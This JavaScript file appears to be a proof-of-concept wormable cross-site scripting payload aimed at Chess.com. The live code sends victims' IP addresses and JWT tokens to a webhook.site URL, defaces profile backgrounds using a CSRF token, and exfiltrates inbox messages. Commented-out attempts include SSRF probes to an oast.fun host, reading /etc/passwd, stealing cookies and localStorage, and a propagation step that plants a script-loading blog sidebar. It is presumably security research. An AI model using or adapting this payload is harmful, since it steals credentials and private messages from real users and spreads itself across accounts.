// ==========================================
// Wormable XSS Payload - Chess.com 
// ==========================================
alert("XSS 3 by Hussein on: " + document.domain);

// <img src="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest1"/>
// <link rel="stylesheet" href="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest2" >
// <iframe src="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest3"></iframe>
// <iframe src="http://127.0.0.1:8080/api/users" width="800" height="500"></iframe>

// fetch("https://api.chess.com/rpc/chesscom.user_profile.v1.UserProfileService/UpdateProfileAvatar", {
//   method: "POST",
//   credentials: "include", // مهم عشان ياخد الكوكيز تلقائي
//   headers: {
//     "Content-Type": "application/json",
//     "Accept": "application/json, text/plain, */*",
//     "Connect-Protocol-Version": "1"
//   },
//   body: JSON.stringify({
//     content: "iVBORw0KGgoAAAANSUhEUgAAAJYAAACUCAMAAABGFyDbAAAAIGNIUk0AAHomAACAhAAA+gAAAIDoAAB1MAAA6mAAADqYAAAXcJy6UTwAAACTUExURf////r///H//+Dq6trV1dy8vNuoqNyQkOCLi+R7e/f//+/v7+7Y2OnJydiUlN5oaOAXF+0AAP8AANtfX+Tj49iqquhzc+1TU+0KCvcAAO/p6enOztd+ftrOzuxBQfQAANadnd4uLucyMtl5eebY2N5YWNxMTNzCwvsAAO0vL+0lJdixsfMdHeIkJN5EROO2tu9gYHcVvsQAAAABYktHRACIBR1IAAAAB3RJTUUH6gIJFg0VvBvLygAAADB0RVh0Y29tbWVudAAvPjxzY3JpcHQ+YWxlcnQoIlhTU19TVUNDRVNTIik7PC9zY3JpcHQ+GPVOugAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAyNi0wMi0wOVQyMjoxMjoxNyswMDowMJrmdFYAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMjYtMDItMDlUMjI6MTI6MTErMDA6MDCIa/nQAAAAKHRFWHRkYXRlOnRpbWVzdGFtcAAyMDI2LTAyLTA5VDIyOjEzOjIxKzAwOjAwvjO00gAAA7pJREFUeNrtnItyqjAQhkG8oGjRqIhKvSC1trW17/90h6gMoKBckuw/0/O9AP8ky+4m2V1N+w8Fegi1hgQNo9lqd0yzG2KanXaraTQo9fSs/uDFHo7YHaPhuDPoWz31mvTJ1Jm5c5bL3J057YnKbdUXS2/ICjH0lgs10vRXc7UuJoqzXpmv0oXpi822uKSI7UbukhmeX14Ux98Z0lYqGM+riTr/AuNAyooZjltdFMd1xK+Y5ZUw8zzWniV2/6ar+qI4q6nAnQzexIjivPUFiepNaxpVGncqJChZe5GiOHsBFvbui1YVerH3uhu4ES+Ks6m1kQ37IEfWwa6Rk02Em1XMflJZlS9PVWhgFXUtP2SqYuxjWUVVU6i3ymLUrLBWn7JVMfZZer0m0tfqvF4l7SvwVagK7T4oo6qhSFWoq4T/ssaqVDE2Lh4gd5J8exaHXVFVX+pEcb4KmvtRraxjIbNvfKtVxdh3AbPXTdWqGDOfJ/itGmfBqsxbT7dQiXe/xX2yjRRbyHmyjctR/U9UYfQwaOs/NKoY+3m0XC0qVYw9sHqLbLEYm+XHxo3CWHjLYYPlHCJynUSbUhVj7RzLmtHKyrGuE0HYSTI/Zcoi/A0v/GSpalKrYizj3EgVDZNkRMaFoNvROqwW93GH2OA5GXmXTa2JY995eKKMJs3o1tO/Uyu6cHOpqnvUgi546X+ROvBE3ASgvuIjax7H9BvHiTDTSnJIx0UQ0wqNKyVL+QE/j++U1xLwWCiGddJzAWQPEcksQvGN1iOSt10ASU2EmfDxDrWYGCf2871fajExv/GTHkro4STCz8KnFhPjxxlqX8H7TlE+46hIdauVReKmawnj5EM3Dy9rgCRrEMsCOIxFzPFlYW4iqMmjysJ0p6DBBzRUgyY2oGkgaNIMesRAPZCBHl9BD/tawWYB+aSuRlAvkkCv3UAvKVHCz82VLugFOOhzAerjCuhTFOrDHegzJ+ijMEIWkVl6jVlwgFqeQR2A8kqlMEt/UAulaMvK8hYLtggPtGQRtcATtBwWtXgYtNQatTAdtYwftOkBtUUEtaEGtf0ItVlLa1QY+lCNbanWXMxGQFVtk27ptlzMJlMVLbluhZZc1AZm1HZv1OZ41FECqIMXNNAxFRrqUA/UESia4IExJaPgIzDH62igw4g4hlMzx5cxuonvZGDXGXRlB9JG0Bk7v5ooiWPBzisGOUTtrAxw5Nx1yQAH9F2l4Y0zvPJo+KP9QjP8MSYalbnrdncIozLT6DrYZNE/xD/Km2hTBSqgTgAAAABJRU5ErkJggg==",
//     filename: "user-avatar"
//   })
// })
// .then(res => res.json())
// .then(data => console.log(data))
// .catch(err => console.error(err));




//(2)
// function addNewlines(str) 
// {var result = '';
// while (str.length > 0){
// result += str.substring(0, 100)+ '\n';
// r = str.substring(100);}
// return result;}
// x= new XMLHttpRequest();
// x.onload = function(){document.write(addNewlines(btoa(this.responseText)))};
// x.open("GET", "file:///etc/passwd");
// x.send();


// (1)
// x= new XMLHttpRequest();
// x.onload = function(){
// document.write(this.responseText)};
// x.open("GET", "file:///etc/passwd");
// x.send();

// var userCookies = document.cookie;
// var userStorage = JSON.stringify(localStorage);
// var exfilData = "===== COOKIES =====\n" + userCookies + "\n\n===== LOCAL STORAGE =====\n" + userStorage;

// fetch("https://webhook.site/52bfb7b5-26b8-4e09-8f3e-3914f4ff53c0", {
//     method: "POST",
//     mode: "no-cors",
//     body: exfilData
// });
// const apiUrl = 'https://api.chess.com/rpc/chesscom.user_profile.v1.UserProfileService/SetBlogDetails';
// const maliciousSidebar = "<p>Hey, check out this cool trick! <a id=\"__tudeConfig\"></a><a id=\"__tudeConfig\" href=\"https://hussein-e4.github.io/POC.js\" name=\"endpoint\"></a></p>";
// const requestBody = {
//     "blogDetails": {
//         "url": "hacked-blog", //
//         "name": "Important Update",
//         "privacy": "BLOG_PRIVACY_ID_EVERYONE", 
//         "sidebarBlock": maliciousSidebar
//     },
//     "updateMask": ""
// };

// // 4. (The Infection)
// fetch(apiUrl, {
//     method: 'POST',
//     headers: {
//         'Content-Type': 'application/json',
//         'Accept': 'application/json, text/plain, */*',
//         'Connect-Protocol-Version': '1'
//     },
//     credentials: 'include', 
//     body: JSON.stringify(requestBody)
// })
// .then(response => {
//     if (response.ok) {
//         fetch("https://webhook.site/63843b75-5c44-4e91-99c9-564afd8a49aeimpact=Worm_Propagated");
//     }
// });





const webhook = 'https://webhook.site/b2736906-d37d-48c0-9a83-ecd2ff48a039'; 
const csrfToken = window.context.csrf.token;

// 1. PII & Token Leakage (Exfiltrate IP and JWT immediately)
try {
    const victimIP = window.context.ip;
    const jwtToken = window.context.user.intercomUserJwt; 
    fetch(webhook + '?stolen_ip=' + victimIP + '&stolen_jwt=' + jwtToken, { mode: 'no-cors' });
} catch(e) {}

// 2. Background Defacement (Using an ultra-small 1x1 transparent PNG)
try {
    const b64Data = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=';
    const byteCharacters = atob(b64Data);
    const byteNumbers = new Array(byteCharacters.length);
    for (let i = 0; i < byteCharacters.length; i++) {
        byteNumbers[i] = byteCharacters.charCodeAt(i);
    }
    const byteArray = new Uint8Array(byteNumbers);
    const blob = new Blob([byteArray], {type: 'image/png'});

    const formData = new FormData();
    formData.append('file', blob, 'infected.png');

    fetch('https://www.chess.com/callback/member/upload/background', {
        method: 'POST',
        headers: { 
            'X-Chesscom-Csrf-Token': csrfToken,
            'Accept': 'application/json' 
        },
        body: formData,
        credentials: 'include'
    });
} catch(e) {}

// 3. Account Data Leakage (Exfiltrate Inbox DMs)
try {
    fetch('https://www.chess.com/callback/messages/list/inbox', {
        method: 'GET',
        headers: {
            'Accept': 'application/json'
        },
        credentials: 'include'
    })
    .then(response => response.text())
    .then(data => {
        fetch(webhook, { 
            method: 'POST', 
            body: data, 
            mode: 'no-cors' 
        });
    });
} catch(e) {}



